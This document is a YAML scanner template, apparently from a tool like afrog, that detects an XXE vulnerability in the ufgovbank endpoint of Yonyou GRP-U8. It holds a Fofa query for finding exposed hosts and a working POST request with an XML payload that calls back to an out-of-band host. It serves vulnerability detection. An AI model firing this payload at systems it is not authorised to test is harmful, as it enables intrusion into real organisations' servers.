id: yonyou-u8-ufgovbank-xxe

info:
  name: 用友GRP-U8 ufgovbank XXE漏洞
  author: zan8in
  severity: high
  verified: true
  description: |-
    用友GRP-U8的ufgovbank接口存在XXE漏洞，攻击者可以在xml中构造恶意命令，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。
    Fofa: app.name="用友GRP-U8 OA"
  reference:
    - https://mp.weixin.qq.com/s?__biz=Mzg2MjkwMDY3OA==&mid=2247484644&idx=1&sn=badecc3ea560d47a30acef5ea3f188e2
  tags: yonyou,grp,u8,xxe
  created: 2024/01/16

set:
  oob: oob()
  oobHTTP: oob.HTTP
rules:
  r0:
    request:
      method: POST
      path: /ufgovbank
      body: |
        reqData=<?xml version="1.0"?>
        <!DOCTYPE foo SYSTEM "{{oobHTTP}}">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest
    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
expression: r0()
